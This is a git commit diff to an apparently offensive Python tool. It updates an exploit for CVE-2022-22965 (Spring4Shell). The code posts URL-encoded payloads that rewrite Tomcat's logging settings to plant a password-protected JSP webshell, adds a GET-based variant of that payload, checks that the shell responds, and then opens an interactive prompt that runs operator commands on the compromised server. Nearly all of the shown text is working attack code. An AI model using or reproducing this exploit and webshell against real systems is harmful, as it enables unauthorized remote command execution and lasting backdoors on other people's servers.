38e4e1610ac5f86c155e69a9ce54b3d5d89a7309
曾哥 <54609266+AabyssZG@users.noreply.github.com>
2023-01-31 11:02:56 +0800

    Update vul.py

--- inc/vul.py
+++ inc/vul.py
@@ -19,20 +19,24 @@ def CVE_2022_22965(url):
         }
     payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
     payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
+    payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
     data1 = payload_linux
     data2 = payload_win
+    getpayload = url + payload_http
     try:
         requests.packages.urllib3.disable_warnings()
         requests.post(url, headers=Headers_1, data=data1, timeout=5, allow_redirects=False, verify=False)
         sleep(1)
         requests.post(url, headers=Headers_1, data=data2, timeout=5, allow_redirects=False, verify=False)
         sleep(1)
-        test = requests.get(url + "/tomcatwar.jsp")
-        if (test.status_code == 200) and (len(test.content) <= 5):
-            cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "/tomcatwar.jsp?pwd=aabysszg&cmd=whoami" ,"red")
+        requests.get(getpayload, headers=Headers_1, timeout=5, allow_redirects=False, verify=False)
+        sleep(1)
+        test = requests.get(url + "tomcatwar.jsp")
+        if (test.status_code == 200) and ('aabysszg' in str(test.text)):
+            cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami" ,"red")
             while 1:
                 cmd = input("[+] 请输入要执行的命令>>> ")
-                url_shell = url + "/tomcatwar.jsp?pwd=aabysszg&cmd=".format(cmd)
+                url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
                 r = requests.get(url_shell)
                 resp = r.text
                 result = re.findall('([^\x00]+)\n', resp)[0]
